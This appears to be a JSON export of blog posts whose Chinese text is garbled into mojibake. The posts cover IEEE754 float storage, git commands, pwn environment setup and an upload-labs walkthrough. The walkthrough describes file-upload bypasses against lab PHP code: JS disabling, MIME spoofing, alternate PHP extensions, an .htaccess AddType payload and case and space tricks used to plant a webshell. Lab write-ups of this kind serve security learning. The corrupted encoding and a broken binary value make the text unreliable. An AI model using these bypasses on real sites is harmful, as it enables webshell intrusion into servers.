æ•°æ“ä½œçš„æ±‡ç¼–æŒ‡ä»¤ä»¥åŠå¯„å­˜å™¨æ–¹é¢çš„çŸ¥è¯†ï¼Œè¿™é‡Œè®°å½•ä¸‹ï¼ˆæ‰€ä½¿ç”¨çš„æ ‡å‡†æ˜¯IEEE754ï¼‰ å…³äºæµ®ç‚¹æ•°åœ¨å†…å­˜ä¸­çš„å­˜å‚¨ä¸‹é¢çš„å›¾æ˜¯32ä½æµ®ç‚¹æ•°ä¸64ä½æµ®ç‚¹æ•°åœ¨å†…å­˜ä¸­çš„å­˜å‚¨å½¢å¼ï¼Œå’Œè®¡ç®—å…¬å¼ å¦‚æœexpå…¨ä¸º1å°±ä»£è¡¨æ— é™å¤§æˆ–è€…NaNï¼ˆnot a numberï¼‰ï¼Œå¦‚æœexpå…¨ä¸º0ä»£è¡¨éè§„æ ¼åŒ– éšååœ¨å¼•å…¥ä¸€ä¸ªæ¦‚å¿µBias,è®¡ç®—å…¬å¼ä¸ºï¼šBias = 2k-1-1ï¼Œå…¶ä¸­kç­‰äºexpæ‰€å çš„äºŒè¿›åˆ¶ä½æ•°ï¼ˆ32ä½çš„æµ®ç‚¹æ•°å 8ä½ï¼Œ64ä½çš„æµ®ç‚¹æ•°å 11ä½ï¼‰32ä½çš„Bisa=127ï¼Œ64ä½çš„Bisa=1023 æµ®ç‚¹æ•°åœ¨å†…å­˜ä¸­çš„å­˜å‚¨åˆ†ä¸ºä¸‰æ®µï¼š ç¬¦å·ä½S é˜¶ç E å°¾æ•°M ç†æ¸…Eï¼Œexpï¼ŒBiasedä¸‰è€…çš„å…³ç³»ä¸‰è€…çš„è®¡ç®—å…¬å¼ä¸ºE = exp - Biasedï¼ˆç‰¹åˆ«çš„ï¼Œå¦‚æœexpç­‰äº0ï¼Œåˆ™å…¬å¼å˜ä¸ºE = 1 - Biasedï¼‰ ä¸€å®šè¦æ³¨æ„é˜¶ç Eä¸ä¼šç›´æ¥å­˜åœ¨å†…å­˜ä¸­ï¼Œè€Œæ˜¯é€šè¿‡ä¸Šé¢çš„è®¡ç®—å°†é˜¶ç Eè½¬åŒ–ä¸ºexpå­˜æ”¾åœ¨å†…å­˜ä¸­ ä¸¾ä¸¤ä¸ªä¾‹å­å°†æ•°12345è½¬åŒ–ä¸ºæµ®ç‚¹æ•°çš„16è¿›åˆ¶å½¢å¼ï¼ˆç”¨32ä½ä¸ºä¾‹å­ï¼‰ é¦–å…ˆå°†12345è½¬åŒ–ä¸ºäºŒè¿›åˆ¶æ•°å½¢å¼ 112345 = (11000000111001)2 å¾—åˆ°12345 = (1.1000000111001)2 x 213ï¼Œé‚£ä¹ˆç°åœ¨å°¾æ•°å°±æ˜¯1.1000000111001ï¼Œå°†å°æ•°ç‚¹å‰é¢çš„1èˆå»ï¼Œåé¢è¡¥0ç›´åˆ°é•¿åº¦ä¸º23ä½å¾—åˆ°å°¾æ•°Mçš„äºŒè¿›åˆ¶è¡¨ç¤ºå½¢å¼ï¼Œè¿˜æœ‰é˜¶ç E=13 110000001110010000000000 è®¡ç®—exp è®¡ç®—çš„æ•°å­—æ˜¯32ä½çš„ï¼Œé€šè¿‡ä¸Šé¢è®¡ç®—å¾—åˆ°é˜¶ç E=13ï¼Œåœ¨é€šè¿‡å…¬å¼exp=E+Biasedï¼Œå¾—åˆ°exp=13+127=140 1140 = (10001100)2 å°†ä¸‰è€…ç»„åˆ 120 10001100 10000001110010000000000s exp frac 1(01000110010000001110010000000000)2 = 0x4640E400 å°†1.8è½¬åŒ–ä¸ºæµ®ç‚¹æ•°çš„16è¿›åˆ¶å½¢å¼ï¼ˆç”¨32ä½ä¸ºä¾‹ï¼‰ å°†1.8è½¬åŒ–ä¸ºäºŒè¿›åˆ¶å½¢å¼ 11.8 = (1.11001100110011001100110)2 ç”±äº1.8è½¬åŒ–ä¸ºäºŒè¿›åˆ¶æ˜¯ä¸€ä¸ªæ— çº¿å¾ªç¯çš„æ•°å­—ï¼Œæ‰€ä»¥å–å‰23ä½å¹¶å‘å‰è¿›ä¸€ä½ è¿™é‡Œé˜¶ç E=0 è®¡ç®—exp å…¬å¼exp=E+Biasedï¼Œå¾—åˆ°exp=0+127 1127 = (01111111)2 å°†ä¸‰è€…ç»„åˆ 1(00111111111001100110011001100116)2 = 0x3FE66666 éªŒè¯ä½¿ç”¨gdbè°ƒè¯•çœ‹çœ‹æ˜¯å¦æ˜¯è¿™æ ·å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œä½¿ç”¨å‘½ä»¤gcc -g -m32 check.c -o checkç¼–è¯‘ 1234567891011121314#include &lt;stdio.h&gt;void func1(float a, float b) &#123; float x = a; float y = b;&#125;int main() &#123; float a = 12345; float b = 1.8; func1(a, b); return 0;&#125; 12345 0x565561ce &lt;main+34&gt; push dword ptr [ebp - 4] 0x565561d1 &lt;main+37&gt; push dword ptr [ebp - 8]â–º 0x565561d4 &lt;main+40&gt; call func1 &lt;func1&gt; arg[0]: 0x4640e400 arg[1]: 0x3fe66666 å¯ä»¥çœ‹åˆ°å’Œä¸Šé¢è®¡ç®—çš„å€¼æ˜¯ä¸€æ ·çš„ï¼Œ64ä½çš„åŒç²¾åº¦æµ®ç‚¹æ•°ä¹Ÿæ˜¯è¿™æ ·è®¡ç®— æµ®ç‚¹æ•°æ“ä½œå¸¸ç”¨æŒ‡ä»¤ç°åœ¨ä½¿ç”¨çš„å¾ˆå¤šæµ®ç‚¹æ•°éƒ½æ˜¯åŒç²¾åº¦æµ®ç‚¹æ•°ï¼Œå®˜æ–¹ä¹Ÿæ¨èä½¿ç”¨åŒç²¾åº¦æµ®ç‚¹æ•° ç§»åŠ¨æŒ‡ä»¤ æµ®ç‚¹æ•°è½¬æ•´å½¢æŒ‡ä»¤ æ•´å½¢è½¬æµ®ç‚¹å‹æŒ‡ä»¤ æµ®ç‚¹æ•°æ“ä½œè¿ç®—","categories":[],"tags":[{"name":"csapp","slug":"csapp","permalink":"http://example.com/tags/csapp/"}]},{"title":"gitå‘½ä»¤å­¦ä¹ ","slug":"learning_git","date":"2022-02-22T12:04:30.024Z","updated":"2022-02-22T13:38:30.216Z","comments":true,"path":"42464/","link":"","permalink":"http://example.com/42464/","excerpt":"","text":"è®°å½•ä¸‹gitå¸¸ç”¨å‘½ä»¤ åœ¨åˆ›å»ºä»“åº“åå¦‚ä½•æ¨é€åˆ°github123456git initgit add README.mdgit commit -m &quot;first commit&quot;git branch -M maingit remote add origin https://github.com/&lt;your github name&gt;/&lt;your resp name&gt;.gitgit push -u origin main #ç¬¬ä¸€æ¬¡æ¨é€ä½¿ç”¨å‘½ä»¤ 1234567git pull #æ›´æ–°ä»“åº“#è¿™ä¸¤ä¸ªå‘½ä»¤å»ºè®®åœ¨æ¨é€ä¸€ç±»æ–‡ä»¶æ—¶ä½¿ç”¨ä¸€æ¬¡git add &lt;file name&gt;git commit -m &quot;xxxxx&quot; git push gitå¸¸ç”¨å‘½ä»¤åˆå§‹åŒ–ä»“åº“ 1git init ä¿®æ”¹æˆ–è€…æ·»åŠ æ–‡ä»¶åè¿›è¡Œçš„æ“ä½œ 12git add &lt;file name&gt;git commit -m &quot;xxxxx&quot; æŸ¥çœ‹æäº¤æ—¥å¿—ï¼ŒæŸ¥çœ‹æäº¤æ—¥å¿—å¯ä»¥è·Ÿå¾ˆå¤šå‚æ•° 1git log ç‰ˆæœ¬å›é€€ 12git reset --hard HEAD^ #å›é€€åˆ°HEADçš„ä¸Šä¸€ä¸ªç‰ˆæœ¬git reset --hard &lt;commit_hash_id&gt; #å›é€€åˆ°ä»»æ„ç‰ˆæœ¬ æŸ¥çœ‹æ¯ä¸€æ¬¡å‘½ä»¤ 1git reflog gitåŒºåˆ†å­˜å‚¨åŒºå’Œå·¥ä½œåŒºï¼Œå·¥ä½œåŒºçš„ä¸œè¥¿è¢«ä¿®æ”¹ååº”è¯¥æ”¾åˆ°å­˜å‚¨åŒºï¼Œåœ¨ä¿®æ”¹æ–‡ä»¶åæ²¡æœ‰æ¨é€åˆ°å­˜å‚¨åŒºæŸ¥çœ‹çŠ¶æ€å°±ä¼šäº§ç”Ÿä¸€ä¸‹è¯´æ˜ 1git status #æŸ¥çœ‹å­˜å‚¨åŒºçŠ¶æ€ å¦‚æœå·²ç»addåˆ°äº†æš‚å­˜åŒºä½¿ç”¨ä¸€ä¸‹å‘½ä»¤ 1git restore --staged &lt;file&gt; åˆ›å»ºåˆ†æ”¯ï¼Œæ”¹å˜åˆ†æ”¯ï¼ˆswitchå’Œcheckoutéƒ½å¯ä»¥ç”¨æ¥æ”¹å˜åˆ†æ”¯ï¼Œæ¨èä½¿ç”¨checkoutï¼‰ 12git chenkout -b &lt;branch name&gt;git checkout &lt;branch name&gt; åˆ†æ”¯åˆå¹¶ 1git merge &lt;branch name&gt; å…³äºåˆ†æ”¯ æ¯ä¸€æ¬¡æäº¤ï¼ˆcommitï¼‰éƒ½ä¼šäº§ç”Ÿä¸€ä¸ªèŠ‚ç‚¹ï¼Œåˆ›å»ºä¸€ä¸ªåˆ†æ”¯å°±åƒåˆ›å»ºä¸€ä¸ªæ–°çš„æŒ‡é’ˆï¼Œæ¯ä¸€ä¸ªåˆ†æ”¯äº’ä¸å½±å“ï¼Œæ¯”å¦‚åœ¨devåˆ†æ”¯æäº¤ï¼ˆcommitï¼‰äº§ç”Ÿçš„æ–°èŠ‚ç‚¹ä¸ä¼šå½±å“masteråˆ†æ”¯ï¼Œå¦‚æœä½¿ç”¨åˆ†æ”¯åˆå¹¶å°±å°†masterç§»åŠ¨åˆ°äº†devåˆ†æ”¯ä½ç½® å…³äºåˆ†æ”¯å†²çª é¦–å…ˆåˆ›å»ºä¸€ä¸ªæ–°åˆ†æ”¯ï¼Œæ–°åˆ†æ”¯ä¿®æ”¹æ–‡ä»¶ 1git checkout -b newbranch éšååˆ‡æ¢æˆmasteråˆ†æ”¯ï¼Œå†æ¬¡ä¿®æ”¹æ–‡ä»¶ 1git checkout master å¦‚æœä¸¤æ¬¡ä¿®æ”¹çš„æ–‡ä»¶ä½ç½®ä¸ä¸€æ ·ï¼Œé‚£ä¹ˆåœ¨åˆå¹¶åˆ†æ”¯æ—¶å°±ä¼šå°†ä¿®æ”¹çš„æ–‡ä»¶åˆå¹¶ï¼Œä½†æ˜¯å¦‚æœnewbranchåˆ†æ”¯å’Œmasteråˆ†æ”¯ä¿®æ”¹çš„æ–‡ä»¶ä½ç½®ä¸€æ ·ï¼Œé‚£ä¹ˆå°±ä¼šäº§ç”Ÿåˆ†æ”¯å†²çªï¼Œéœ€è¦ä¿®æ”¹æ–‡ä»¶ä»è€Œæ‰èƒ½åˆå¹¶åˆ†æ”¯ å†²çªæ–‡ä»¶å¤§æ¦‚é•¿è¿™æ ·ï¼Œ&lt;&lt;&lt;&lt;&lt;å’Œ&gt;&gt;&gt;&gt;&gt;åé¢æ‰€è·Ÿçš„æ˜¯åˆ†æ”¯åï¼Œ=====ä¸Šä¸‹éš”å¼€çš„æ˜¯å†²çªçš„å†…å®¹ 12345&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD branch new hhh=======branch feature1&gt;&gt;&gt;&gt;&gt;&gt;&gt; feature1","categories":[],"tags":[{"name":"git","slug":"git","permalink":"http://example.com/tags/git/"}]},{"title":"pwnç¯å¢ƒæ­å»º","slug":"ctf/pwn/bilibili/pwnç¯å¢ƒæ­å»º","date":"2022-02-07T16:18:50.621Z","updated":"2022-02-08T16:20:18.716Z","comments":true,"path":"11927/","link":"","permalink":"http://example.com/11927/","excerpt":"","text":"ä½¿ç”¨Linuxç‰ˆæœ¬ubuntu20.04 LTS æ­¥éª¤ å®‰è£…ubuntu vimå®‰è£… 1sudo apt-get install vim æ›´æ¢é»˜è®¤æº 1sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak 12345678910111213141516171819deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse focal 12sudo apt-get updatesudo apt-get upgrade è·Ÿæ¢pipæº 12mkdir .pipvim pip.conf 12[global]index-url = https://pypi.tuna.tsinghua.edu.cn/simple å®‰è£…tmux 1sudo apt-get install tmux gdbå®‰è£… 1sudo apt-get install gdb pwntoolså®‰è£…éœ€è¦è¿›å…¥rootæƒé™è¿›è¡Œå®‰è£…ï¼Œå¦åˆ™checksecç­‰å·¥å…·æ— æ³•å®‰è£…æˆåŠŸ 12sudo supip3 install pwntool pwndbgå®‰è£…https://github.com/pwndbg/pwndbg pwngdbå®‰è£…https://github.com/scwuaptx/Pwngdb tmux bugè§£å†³https://github.com/Gallopsled/pwntools/commit/f7283bf2ebcb978d977ef11b4198bb3e1f9373e3 å…¶ä»– patchelf https://github.com/NixOS/patchelf glibc-all-in-one https://github.com/matrix1001/glibc-all-in-one","categories":[],"tags":[]},{"title":"upload-lab","slug":"web_security/upload-labs","date":"2022-01-08T05:05:05.630Z","updated":"2022-01-08T05:05:30.869Z","comments":true,"path":"13303/","link":"","permalink":"http://example.com/13303/","excerpt":"","text":"å‰æçŸ¥è¯†æ–‡ä»¶ä¸Šä¼ çŸ¥è¯† phpæ–‡ä»¶ä¸Šä¼ è¿‡ç¨‹ Less-1(å‰ç«¯ç¦ç”¨JSç»•è¿‡)å‰ç«¯å­˜åœ¨jsä»£ç åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œæ‰€ä»¥ç›´æ¥æµè§ˆå™¨ç¦ç”¨Js 12345678910111213141516171819&lt;script type=&quot;text/javascript&quot;&gt; function checkFile() &#123; var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value; if (file == null || file == &quot;&quot;) &#123; alert(&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;); return false; &#125; //å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ var allow_ext = &quot;.jpg|.png|.gif&quot;; //æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼  if (allow_ext.indexOf(ext_name) == -1) &#123; var errMsg = &quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot; + allow_ext + &quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot; + ext_name; alert(errMsg); return false; &#125; &#125;&lt;/script&gt; ç„¶åå°±å¯ä»¥ç›´æ¥ä¸Šä¼ ä¸€å¥è¯ï¼Œæ³¨æ„uploadæ–‡ä»¶å¤¹åœ¨ç½‘ç«™æ ¹ç›®å½•ã€‚ Less-2ï¼ˆæ£€æŸ¥æ–‡ä»¶ç±»å‹ï¼ŒMIMEç»•è¿‡ï¼‰åç«¯æ£€æµ‹æ–‡ä»¶ç±»å‹ï¼Œä½¿ç”¨å›¾ç‰‡é©¬ï¼ŒæŠ“åŒ…æ—¶å°†filenameçš„åç¼€æ”¹ä¸º.php 1234567891011121314151617181920// phpæºç $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH.&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; é€ æˆåŸå› ï¼šåç«¯åªæ£€æµ‹äº†æ–‡ä»¶çš„ç±»å‹ä½†æ˜¯å¹¶æ²¡æœ‰æ£€æµ‹æ–‡ä»¶åç¼€ï¼Œå¦‚æœæŠ“åŒ…ä¿®æ”¹äº†æ–‡ä»¶åç¼€æ–‡ä»¶ç±»å‹ä»æ˜¯å›¾ç‰‡ç±»å‹ï¼Œæ‰€ä»¥å¯ä»¥é€ æˆæ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚ ä¿®å¤æ–¹æ¡ˆï¼šåœ¨åç«¯æ·»åŠ ä¸€ä¸ªæ–‡ä»¶åç¼€æ£€æµ‹å‡½æ•°ï¼Œå¯ä»¥åœ¨ä»£ç å±‚é¢é¿å…ï¼Œä½†æ˜¯ä¹Ÿä¼šå­˜åœ¨æœåŠ¡å™¨è§£ææ¼æ´ä¸æ˜¯ä»£ç å±‚é¢èƒ½å¤Ÿè§£å†³çš„ä¸œè¥¿ã€‚ Less-3(æœåŠ¡å™¨å¯¹é™Œç”Ÿåç¼€åè§£æ)é¦–å…ˆç›´æ¥ä¸Šä¼ äº†phpæ–‡ä»¶ä¸å‡ºæ„å¤–çš„å¤±è´¥äº†ï¼Œåˆå°è¯•å›¾ç‰‡é©¬æŠ“åŒ…ä¿®æ”¹åç¼€å‘ç°ä¹Ÿå¤±è´¥ï¼Œåº”è¯¥å°±åƒä¹‹å‰è¯´çš„åœ¨åç«¯æ·»åŠ äº†æ£€æµ‹æ–‡ä»¶åç¼€çš„ä»£ç ï¼Œä½†æ˜¯æ²¡æœ‰æ£€æµ‹æ–‡ä»¶å¤´ï¼Œæ‰€ä»¥ä¸ç”¨åœ¨æ–‡ä»¶å¤´æ·»åŠ å¹»æ•°ã€‚ æƒ³æƒ³ä¹‹å‰å­¦çš„ä¸€å…±æœ‰ä¸¤ä¸ªæ€è·¯ï¼šä¸€ä¸ªæ˜¯åˆ©ç”¨phtmlåç¼€çš„æ–‡ä»¶çœ‹çœ‹èƒ½ä¸èƒ½è¿‡é»‘åå•ï¼Œè¿˜æœ‰ä¸€ä¸ªå°±æ˜¯åˆ©ç”¨æœåŠ¡å™¨è§£ææ¼æ´ï¼Œä½†æ˜¯è¿™ä¸ªæ˜¯æœ‰æ¡ä»¶çš„ï¼Œå…·ä½“æ¡ä»¶å¿˜äº†æ…¢æ…¢å°è¯•ã€‚ èƒ½å¤Ÿä¸Šä¼ .phtmlåç¼€çš„æ–‡ä»¶ï¼Œä½†æ˜¯æœåŠ¡å™¨ä¸èƒ½åè§£æï¼Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼ŒæŠ“åŒ…çš„æ—¶å€™å‘ç°äº†è¿™ä¸ªä¸œè¥¿ æ–‡ä»¶åè®©äººç»™æ”¹äº†ï¼Œçœ‹è¿™ä¸ªæ ¼å¼ä¼°è®¡æ˜¯æ”¹æˆäº†æ—¶é—´æˆ³ï¼Œå†æ¬¡è¿›å…¥uploadç›®å½•è®¿é—®è¿™ä¸ªæ–‡ä»¶è§£ææˆåŠŸäº†ï¼Œä½†æ˜¯èšå‰‘è¿ä¸ä¸Šï¼Œæˆ‘ä¹‹åæœ‰å¾€é‡Œé¢æ·»åŠ äº†phpinfo()ä¹Ÿæ²¡æœ‰è§£æå‡ºæ¥ï¼Œå®åœ¨æ˜¯å¥‡æ€ªã€‚å°è¯•ç”¨å¦ä¸€ç§æ–¹æ³•ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰æœåŠ¡å™¨è§£ææ¼æ´ã€‚éƒ½ä¸è¡Œï¼Œä¸Šç½‘æœäº†æœï¼Œå‘ç°æ˜¯apacheçš„é…ç½®æ–‡ä»¶ä¸­æ²¡æœ‰è®¾ç½®å¯ä»¥è§£æphtmlï¼Œphp5ï¼Œphp3ç­‰æ–‡ä»¶åç¼€ï¼Œéœ€è¦è®¾ç½®ä¸€ä¸‹ã€‚ è®°å½•ä¸€ä¸‹ï¼Œç”±äºdockerä¸­çš„ç³»ç»Ÿæ˜¯ubuntuçš„ï¼Œæ‰€ä»¥apacheçš„é»˜è®¤å®‰è£…è·¯å¾„ä¸º/etc/apache2ï¼Œé…ç½®æ–‡ä»¶ä¹Ÿä¸å†æ˜¯httpd.confè€Œæ˜¯apache2.confï¼Œç„¶ådockerä¸­åˆä¸èƒ½å®‰è£…vimï¼Œä¹Ÿæ²¡æœ‰vi????ï¼Œæœ€åä½¿ç”¨å‘½ä»¤echo &quot;AddType application/x-httpd-php .php .phtml .phps .php5 .pht&quot; &gt;&gt; apache2.confï¼Œé‡å¯containeré…ç½®æˆåŠŸï¼Œphp3 php5 phtmlåç¼€æ–‡ä»¶å…¨éƒ¨éƒ½èƒ½è§£æã€‚ 1234567891011121314151617181920212223242526272829//ä½œè€…æºç $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; æ€»ç»“ï¼šç¬¬ä¸‰å…³è¦å­¦ä¹ çš„å³ä½¿ç»•è¿‡é»‘åå•ï¼Œåœ¨å®é™…ä¸­é»‘åå•æ°¸è¿œæ¯”ç™½åå•å¥½ç»•è¿‡ï¼Œä¸€ä¸ªæ˜¯ä¸èƒ½ä¸Šä¼ å“ªäº›ï¼Œä¸€ä¸ªæ˜¯åªèƒ½ä¸Šä¼ å“ªäº›ï¼Œå½“è¿‡æ»¤ä¸ä¸¥æ ¼æ—¶å¯ä»¥ç”¨phtmlï¼Œphp5ï¼Œphp3ï¼Œphtç­‰åç¼€æ–‡ä»¶ä¸Šä¼ ç»•è¿‡ã€‚ Less-4(ä½¿ç”¨.htaccessç»•è¿‡é»‘åå•)ä½¿ç”¨.htaccessåæ–‡ä»¶æ¥ç»•è¿‡ï¼Œä½¿ä»–å¯ä»¥å°†å…¶ä»–åç¼€çš„æ–‡ä»¶è§£ææˆphpæ–‡ä»¶ï¼Œåç«¯æºç é»‘åå•ä¸­è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ã€‚ 1AddType application/x-httpd-php .png ï¼ˆæŠŠ.pngæ–‡ä»¶å½“åš.phpæ–‡ä»¶æ¥è§£æï¼‰ ä¸Šä¼ ä¸Šå»ï¼Œç„¶ååœ¨ä¸Šä¼ pngåç¼€çš„åé—¨ 1234567891011121314151617181920212223242526272829# æºç $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; Less-5(åç¼€é¢å¤§å°å†™ç»•è¿‡)ç¦æ­¢äº†ä¹‹å‰å…³å¡æ‰€æœ‰çš„ç»•è¿‡æ–¹å¼ï¼Œçœ‹æç¤ºå’Œç½‘ä¸Šæ•™ç¨‹ï¼Œä½¿ç”¨æ–‡ä»¶ååç¼€å¤§å°å†™æ–¹å¼ç»•è¿‡ã€‚ä½†æ˜¯æœåŠ¡å™¨è§£æä¸äº†ï¼Ÿï¼Ÿï¼Ÿï¼Œåç¼€ä¸æ­£å¸¸çš„éƒ½è§£æä¸äº†ï¼Œè¿™ä¸ªé…ç½®æ˜¯æ€ä¹ˆé…ç½®çš„ã€‚æŸ¥çœ‹githubé¡¹ç›®ï¼Œä¿®æ”¹äº†docker-php.confçš„ä¸€äº›ä¸œè¥¿ï¼Œå‘ç°å¯ä»¥äº†ï¼Ÿï¼Ÿï¼Œå¥‡æ€ªå¾—å¾ˆã€‚ ä½†æ˜¯å¦‚æœç›´æ¥åœ¨æµè§ˆå™¨çš„urlå¤„è¾“å…¥ä¼šæŠŠæ‰€æœ‰çš„è¾“å…¥å˜æˆå°å†™ï¼Œéœ€è¦ç”¨åˆ°hackbarï¼Œè¿™ä¸‹å¯ä»¥è§£æå¤§å°å†™åç¼€çš„ä¸œè¥¿äº†ã€‚ æ³¨æ„å¦‚æœä½¿ç”¨æ–‡ä»¶åç¼€å¤§å°å†™ç»•è¿‡æœ€å¥½ç”¨hackbarï¼Œä¸è¦ç›´æ¥è¾“å…¥ï¼Œä¼šå°†ä½ çš„è¾“å…¥å…¨éƒ¨è‡ªåŠ¨å˜æˆå°å†™ã€‚ Less-6(Winodwsä¸‹æ–‡ä»¶åç¼€ç©ºæ ¼ç»•è¿‡)ä½¿ç”¨ç©ºæ ¼ç»•è¿‡ï¼Œæºç ä¸­å°‘äº†è¿™ä¸ªè¯­å¥ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨bpæŠ“åŒ…ç»™æ–‡ä»¶åç¼€æ·»åŠ ç©ºæ ¼ã€‚ 1$file_ext = trim($file_ext); //é¦–å°¾å»ç©º 